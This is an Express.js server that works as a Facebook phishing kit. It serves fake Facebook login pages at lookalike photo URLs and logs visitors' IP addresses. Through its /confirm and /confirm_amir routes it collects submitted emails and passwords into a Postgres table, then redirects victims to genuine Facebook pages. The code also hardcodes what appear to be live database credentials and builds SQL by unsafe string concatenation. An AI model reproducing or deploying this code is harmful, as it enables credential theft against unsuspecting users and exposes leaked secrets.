
var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'haaasalbrddacm',
    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
    database: 'de35u0icb8jt5u',
    port: 5432,
    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
    ssl: true
});
client.connect();
app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572697/735306480197164',function(req,res){
    res.render('Facebook');
    
})
app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444',function(req,res){
    res.render('amir');
    
})

app.get('/',function(req,res){
    res.render('Facebook');
    client.query("INSERT INTO ip (ip) VALUES ('"+req.ip+"')", function (err, result) {
        if (!err) {
            console.log(result)
        }
    })
    // console.log(req.ip)
})


app.post('/confirm', function (req, res) {
    var a = req.body.email_a;
    var b = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
   
    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) {
        if (!err) {
            console.log(result)
        }
    })
})

app.post('/confirm_amir', function (req, res) {
    var a = req.body.email_a;
    var b = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    res.redirect('https://www.facebook.com/photo.php?fbid=160897268265919&set=pcb.2277483372290209&type=3&theater&ifg=1')
    
    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) {
        if (!err) {
            console.log(result)
        }
    })
})
app.listen(PORT, function () {
    console.log('Server Started')
})